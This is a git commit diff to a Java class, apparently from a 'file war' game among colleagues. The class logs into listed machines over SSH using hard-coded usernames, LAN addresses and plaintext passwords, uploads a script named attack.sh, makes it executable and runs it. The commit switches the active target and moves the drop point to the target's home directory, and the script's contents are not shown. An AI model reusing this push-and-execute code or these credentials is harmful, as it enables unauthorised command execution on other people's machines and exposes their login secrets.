4b2a7a755262ac998e382909c37f328564be7198
thales-als <thalessouza.dev@gmail.com>
2024-12-09 11:07:43 -0300

    final

--- guerra-arquivos/src/main/java/conexao/Conexao.java
+++ guerra-arquivos/src/main/java/conexao/Conexao.java
@@ -16,9 +16,9 @@ public class Conexao {
 //                new UserConnection("almaviva-linux", "192.168.208.79", "renato@1234", porta), // João
 //                new UserConnection("matheus", "192.168.208.49", "magna@123", porta), // Matheus
 //                new UserConnection("almaviva-linux", "192.168.208.46", "Almaviva04092004", porta), // Leonardo
-                new UserConnection("almaviva", "192.168.208.53", "magna@123", porta) // Guilherme
+//                new UserConnection("almaviva", "192.168.208.53", "magna@123", porta) // Guilherme
 
-//                new UserConnection("almaviva-linux", "192.168.208.79", "renato@1234", porta), // Renato
+                new UserConnection("almaviva-linux", "192.168.208.79", "renato@1234", porta) // Renato
 //                new UserConnection("almaviva-linux", "192.168.208.73", "magna@123", porta), // Gustavo
 //                new UserConnection("almaviva-linux", "192.168.208.101", "Magna@123", porta), // Eric
 //                new UserConnection("vitor", "192.168.208.95", "vito@123!", porta) // Victor
@@ -27,7 +27,7 @@ public class Conexao {
 
         for (UserConnection user : userConnections) {
             connectToUser(user);
-            String remoteDirectory = "/home/" + user.getUsername() + "/GuerraArquivos/";
+            String remoteDirectory = "/home/" + user.getUsername() + "/";
             sendFileToUser("/opt/dev/projects/github-personal/almaviva-projetos/guerra-arquivos/src/main/resources/scripts/attack.sh", remoteDirectory);
             runCommandOnUser("chmod +x " + remoteDirectory + "attack.sh");
             runCommandOnUser("cd " + remoteDirectory + " && ./attack.sh");
@@ -53,11 +53,8 @@ public class Conexao {
         try {
             channelSftp = (ChannelSftp) session.openChannel("sftp");
             channelSftp.connect();
-
             System.out.println("Canal SFTP aberto.");
-
             channelSftp.put(localFilePath, remoteDirectory);
-
             System.out.println("Arquivo enviado para " + remoteDirectory);
         } catch (JSchException | SftpException e) {
             System.out.println("Erro ao enviar o arquivo: " + e.getMessage());
